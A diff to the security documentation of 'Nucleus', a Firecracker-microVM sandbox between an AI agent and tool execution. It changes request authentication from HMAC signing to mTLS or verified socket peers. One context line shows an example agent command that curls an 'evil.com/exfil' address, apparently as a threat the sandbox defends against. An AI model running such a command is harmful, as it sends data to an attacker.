@@ -59,7 +59,7 @@ Nucleus interposes a Firecracker microVM between the AI agent and tool execution
 │         ▼                                                        │
 │  ┌─────────────────────────────────────────────────────────────┐│
 │  │  nucleus-node                                                ││
-│  │  ├── HMAC-SHA256 signature verification                     ││
+│  │  ├── mTLS client-identity verification                      ││
 │  │  ├── Lattice-guard permission check                         ││
 │  │  └── Approval token validation                              ││
 │  └─────────────────────────────────────────────────────────────┘│
@@ -182,7 +182,7 @@ openclaw exec "curl http://evil.com/exfil"
 |-----------|-----------|
 | **Filesystem isolation** | Firecracker VM with mapped `/workspace` only |
 | **Network isolation** | Linux network namespace, iptables egress rules |
-| **Request authenticity** | HMAC-SHA256 signing of all requests |
+| **Request authenticity** | mTLS client identity, or a kernel-verified vsock / Unix-socket peer |
 | **Approval audit** | Cryptographically chained audit log |
 | **Secret protection** | Credentials in macOS Keychain, never in VM |
 | ** Uninhabitable state detection** | Lattice-guard alerts on dangerous combinations |
